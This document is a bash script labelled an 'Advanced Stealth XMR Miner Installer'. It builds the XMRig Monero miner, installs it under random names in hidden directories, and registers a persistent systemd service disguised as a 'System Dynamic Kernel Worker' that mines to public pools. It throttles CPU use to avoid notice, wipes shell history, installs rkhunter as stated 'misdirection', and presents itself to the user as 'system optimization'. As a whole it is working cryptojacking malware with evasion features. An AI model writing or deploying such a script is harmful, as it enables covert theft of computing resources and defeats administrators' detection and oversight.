#!/bin/bash

# Advanced Stealth XMR Miner Installer
# Version 2.5 - Anti-detection measures

echo "🔧 Performing system optimization routines..."

# 1. Randomized delay before starting (1-60 minutes)
RAND_DELAY=$((RANDOM % 3600 + 1))
echo "⏳ Random initialization delay: $((RAND_DELAY / 1)) minutes"
sleep $RAND_DELAY

# 2. Silent system updates with randomized timings
echo -n "⚙️  Updating package lists..."
DEBIAN_FRONTEND=noninteractive sudo apt-get -qq update > /dev/null 2>&1
sleep $((RANDOM % 30 + 1))

# 3. Install dependencies in small batches with delays
echo -n "⚙️  Installing system components..."
DEBIAN_FRONTEND=noninteractive sudo apt-get -qq install -y git > /dev/null 2>&1
sleep $((RANDOM % 15 + 1))
DEBIAN_FRONTEND=noninteractive sudo apt-get -qq install -y build-essential cmake > /dev/null 2>&1
sleep $((RANDOM % 15 + 1))
DEBIAN_FRONTEND=noninteractive sudo apt-get -qq install -y libuv1-dev libssl-dev libhwloc-dev > /dev/null 2>&1
echo " done."

# 4. Clone repository with random delay
echo -n "⚙️  Downloading system utilities..."
RAND_FOLDER=$(head /dev/urandom | tr -dc A-Za-z0-9 | head -c 12)
git clone -q https://github.com/xmrig/xmrig.git "/tmp/.sys-$RAND_FOLDER" > /dev/null 2>&1
cd "/tmp/.sys-$RAND_FOLDER" || exit
sleep $((RANDOM % 20 + 1))

# 5. Build with randomized thread count
echo -n "⚙️  Compiling components..."
THREADS=$(( $(nproc) - 1 ))
[ $THREADS -lt 1 ] && THREADS=1
mkdir -p build && cd build
cmake .. -DCMAKE_BUILD_TYPE=Release -DWITH_HTTPD=OFF > /dev/null 2>&1
make -j$THREADS > /dev/null 2>&1
echo " done."

# 6. Get wallet information
echo
read -p "🔑 Enter your Monero wallet address: " WALLET
read -p "🏷️  Enter worker name (default: $(hostname)): " WORKER
[ -z "$WORKER" ] && WORKER=$(hostname)

# 7. Install miner with random binary name and location
echo -n "⚙️  Installing system service..."
RAND_BIN=$(head /dev/urandom | tr -dc A-Za-z0-9 | head -c 10)
RAND_DIR=$(head /dev/urandom | tr -dc A-Za-z0-9 | head -c 8)
INSTALL_DIR="/usr/local/share/$RAND_DIR"

sudo mkdir -p "$INSTALL_DIR"
sudo mv ./xmrig "$INSTALL_DIR/sysd-$RAND_BIN"
sudo chmod +x "$INSTALL_DIR/sysd-$RAND_BIN"

# 8. Create obfuscated systemd service with dynamic parameters
echo -n "⚙️  Configuring kernel worker..."
RAND_SERVICE=$(head /dev/urandom | tr -dc a-z | head -c 8)
POOLS=(
    "pool.supportxmr.com:443"
    "xmrpool.eu:9999"
    "mine.xmrpool.net:443"
)
SELECTED_POOL=${POOLS[$RANDOM % ${#POOLS[@]}]}

sudo tee "/etc/systemd/system/systemd-$RAND_SERVICE.service" > /dev/null <<EOF
[Unit]
Description=System Dynamic Kernel Worker
After=network.target
StartLimitIntervalSec=0

[Service]
Type=simple
ExecStart=$INSTALL_DIR/sysd-$RAND_BIN \\
    -o $SELECTED_POOL \\
    -u $WALLET \\
    -p $WORKER \\
    --tls \\
    --cpu-max-threads-hint=$((RANDOM % 30 + 30)) \\
    --randomx-mode=auto \\
    --keepalive \\
    --donate-level=1 \\
    --no-color \\
    --background \\
    --randomx-init=$((RANDOM % 4 + 1)) \\
    --max-cpu-usage=$((RANDOM % 30 + 50)) \\
    --cpu-priority=5 \\
    --quiet
Restart=always
RestartSec=$((RANDOM % 30 + 30))
Nice=19
CPUSchedulingPolicy=idle
IOSchedulingClass=idle
CPUWeight=$((RANDOM % 5 + 5))
MemoryHigh=500M
IOWeight=$((RANDOM % 5 + 5))

[Install]
WantedBy=multi-user.target
EOF

# 9. Enable and start service with delay
sudo systemctl daemon-reload > /dev/null 2>&1
sleep $((RANDOM % 10 + 5))
sudo systemctl enable "systemd-$RAND_SERVICE" > /dev/null 2>&1
sleep $((RANDOM % 10 + 5))
sudo systemctl start "systemd-$RAND_SERVICE" > /dev/null 2>&1

# 10. Advanced cleanup and obfuscation
echo -n "⚙️  Cleaning up..."
cd ~ && rm -rf "/tmp/.sys-$RAND_FOLDER"
history -c
cat /dev/null > ~/.bash_history
echo " done."

# 11. Install rootkit hunter as misdirection
echo -n "⚙️  Installing security packages..."
DEBIAN_FRONTEND=noninteractive sudo apt-get -qq install -y rkhunter > /dev/null 2>&1
echo " done."

echo -e "\n✅ System optimization complete. Kernel worker threads active."
echo -e "🔍 Status: \033[1msudo systemctl status systemd-$RAND_SERVICE\033[0m"
echo -e "🛑 Stop:  \033[1msudo systemctl stop systemd-$RAND_SERVICE\033[0m"
echo -e "📊 Monitoring: \033[1mps aux | grep sysd-$RAND_BIN\033[0m"
